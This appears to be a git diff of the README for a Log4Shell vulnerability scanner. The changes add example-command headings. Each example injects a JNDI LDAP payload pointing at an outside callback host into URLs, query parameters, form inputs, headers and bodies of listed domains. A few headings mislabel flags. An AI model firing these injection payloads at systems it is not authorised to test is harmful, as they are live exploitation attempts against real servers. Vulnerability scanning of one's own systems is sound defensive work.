@@ -75,7 +75,7 @@ python3 scanForLog4jVulnerability.py -f ./domains.txt -t 2 -k -s "http" -s "http
 The source file flag is a required flag to begin using this script. It is best practice to run the program from within the virtual environment folder and use either a relative file path from the virtual environment folder or a fully qualified path that is also mapped to your operating system. The examples below provide users of different operating systems context and syntax for relative and explicit file paths. These examples assume you have cloned the Log4jShell_Scanner in to your downloads folder and have used default operating system (OS) settings during OS installation.
 
 
-## Example File Paths to domains.txt
+### Example File Paths to domains.txt
 
 ```
 Windows  
@@ -100,7 +100,7 @@ If you do not know where you cloned the Log4jShell_Scanner, then for mac and lin
 Windows displays your explicit file path in the command prompt.  
 This will help you construct an explicit file path to the domains.txt file so that you can run this program.  
 
-Example Log4jShell command using the -f FILESOURCE flag:
+### Example Log4jShell_Scanner command using the -f FILESOURCE flag:
 
 ```shell
 python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}'
@@ -111,6 +111,8 @@ python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shel
 
 The timeout flag sets the time that your computer will await a response from the webpage in seconds (s). This flag is optional and the default timeout is 3 seconds. This parameter accepts positive integers only. Using a negative number will set the timeout to 0 and no scans will be performed.
 
+### Example Log4jShell_Scanner command using the -t Timeout flag:
+
 ```shell
 python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -t 2
 ```
@@ -120,8 +122,10 @@ python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shel
 
 Webpages that are not in a production environment may not possess valid Secure Sockets Layer (SSL) certificates or a SSL certificate may have expired without someone within the organization noticing the expiration. In these two circumstances, it may be wise to use the -k flag. This will ensure that webpages without valid SSL certificates are still tested using the payload provided.
 
+### Example Log4jShell_Scanner command using the -k Ignore Invalid Certificates flag:
+
 ```shell
-python3 scanForLog4jVulnerability.py -f ./domains.txt -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -k
+python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -k
 ```
 
 
@@ -129,8 +133,10 @@ python3 scanForLog4jVulnerability.py -f ./domains.txt -s "https" -p '${jndi:ldap
 
 Hypertext Transfer Protocol (HTTP) and Hypertext Transfer Protocol Secure (HTTPS) are the only schemes currently supported. If you do not specify a scheme, then this shell script will test both HTTP and HTTPS.
 
+### Example Log4jShell_Scanner command using the -k Ignore Invalid Certificates flag:
+
 ```shell
-python3 scanForLog4jVulnerability.py -f ./domains.txt -s "https" -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}'
+python3 scanForLog4jVulnerability.py -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}'
 ```
 
 
@@ -152,6 +158,8 @@ As was stated in the introduction, this application does not perform resource di
 
 If your domains.txt file contains query parameters supplied with the current host in domains.txt and this flag is set, then it will inject the payload in to that query. e.g. host/search?q=userResponse will become host/search?q=payload. If no query parameter is supplied with the current host in domains.txt and this flag is set, then this script will attempt host?fuzzqp=payload. 
 
+#### Example Log4jShell_Scanner command using the -q Fuzz Query Parameters flag:
+
 ```shell
 python3 scanForLog4jVulnerability -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -q
 ```
@@ -160,6 +168,8 @@ python3 scanForLog4jVulnerability -f ./domains.txt -p '${jndi:ldap://log4shell.h
 ### Fuzz Inputs -i or --fuzzinputs (optional)
 
 Setting this flag will automatically discover form inputs on every webpage this script is pointed at.
+
+#### Example Log4jShell_Scanner command using the -f Fuzz Inputs flag:
 
 ```shell
 python3 scanForLog4jVulnerability -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -i
@@ -171,6 +181,8 @@ python3 scanForLog4jVulnerability -f ./domains.txt -p '${jndi:ldap://log4shell.h
 Setting this flag will fuzz the following commonly logged headers: User-Agent, Referrer-Policy, Accept, Logger
 Please submit a pull request adding a header if it is not included here and it is commonly logged within your technology stack. The list begins on line 271 and ends on line 274.
 
+#### Example Log4jShell_Scanner command using the -z Fuzz Headers flag:
+
 ```shell
 python3 scanForLog4jVulnerability -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -z
 ```
@@ -179,6 +191,8 @@ python3 scanForLog4jVulnerability -f ./domains.txt -p '${jndi:ldap://log4shell.h
 ### Fuzz Body Parameters -b or --fuzzbodyparams (Work in Progress)
 
 Setting this flag will post the payload in to the body parameter 'fuzzbp'.
+
+#### Example Log4jShell_Scanner command using the -b Fuzz Body Parameters flag:
 
 ```shell
 python3 scanForLog4jVulnerability -f ./domains.txt -p '${jndi:ldap://log4shell.huntress.com:1389/490de66a-129b-41b4-b194-69071695c39b}' -b
